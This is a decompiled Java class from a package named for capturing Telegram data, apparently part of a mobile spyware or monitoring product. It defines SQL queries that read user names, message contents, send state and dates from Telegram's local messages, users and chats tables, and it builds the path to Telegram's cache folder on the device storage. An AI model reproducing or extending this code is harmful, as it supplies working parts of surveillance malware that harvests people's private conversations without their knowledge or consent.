package com.vvt.capture.telegram;

public class c
{
  public static final String a;
  public static final String b;
  public static final String c;
  public static final String d;
  public static final String e;
  public static final String f;
  
  static
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "name";
    arrayOfObject[m] = "data";
    arrayOfObject[k] = "users";
    arrayOfObject[j] = "uid";
    a = String.format("SELECT %s,%s FROM %s WHERE %s = ?", arrayOfObject);
    arrayOfObject = new Object[8];
    arrayOfObject[0] = "data";
    arrayOfObject[m] = "out";
    arrayOfObject[k] = "send_state";
    arrayOfObject[j] = "uid";
    arrayOfObject[i] = "messages";
    arrayOfObject[5] = "date";
    arrayOfObject[6] = "date";
    arrayOfObject[7] = "date";
    b = String.format("SELECT %s,%s,%s,%s FROM %s WHERE %s > ? AND %s <= ? ORDER BY %s ASC", arrayOfObject);
    arrayOfObject = new Object[j];
    arrayOfObject[0] = "date";
    arrayOfObject[m] = "messages";
    arrayOfObject[k] = "date";
    c = String.format("SELECT %s FROM %s ORDER BY %s DESC LIMIT 1", arrayOfObject);
    arrayOfObject = new Object[j];
    arrayOfObject[0] = "name";
    arrayOfObject[m] = "chats";
    arrayOfObject[k] = "uid";
    d = String.format("SELECT %s FROM %s WHERE %s = ?", arrayOfObject);
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "date";
    arrayOfObject[m] = "date";
    arrayOfObject[k] = "messages";
    arrayOfObject[j] = "date";
    e = String.format("SELECT %s FROM (SELECT %s FROM %s ORDER BY ? DESC) ORDER BY %s ASC LIMIT 1", arrayOfObject);
    arrayOfObject = new Object[k];
    arrayOfObject[0] = "/sdcard";
    arrayOfObject[m] = "Android/data/org.telegram.messenger/cache";
    f = String.format("%s/%s/", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */